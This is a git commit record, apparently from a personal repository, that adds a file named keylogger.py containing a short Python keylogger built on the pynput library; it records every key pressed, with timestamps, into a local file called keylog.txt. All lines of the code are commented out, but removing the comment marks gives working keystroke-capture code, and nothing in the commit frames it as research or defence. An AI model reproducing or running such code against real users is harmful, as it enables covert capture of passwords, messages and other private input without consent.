c2e060e678b6fdf70f95b0e57491b9c13c1444cd
voidReq <100312344+voidReq@users.noreply.github.com>
2024-02-29 15:08:20 -0600

    Create keylogger.py

---
+++ keylogger.py
@@ -0,0 +1,15 @@
+#from pynput.keyboard import Key, Listener
+#import logging
+#
+#def Keylogger(on):
+#  while on == 1:
+#    logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")
+#  
+#    def on_press(key):
+#      logging.info(str(key))  
+#    with Listener(on_press=on_press) as listener :
+#      listener.join()
+#    return("Success Starting")
+#  if on == 0:
+#    return("Success Finishing")
+  
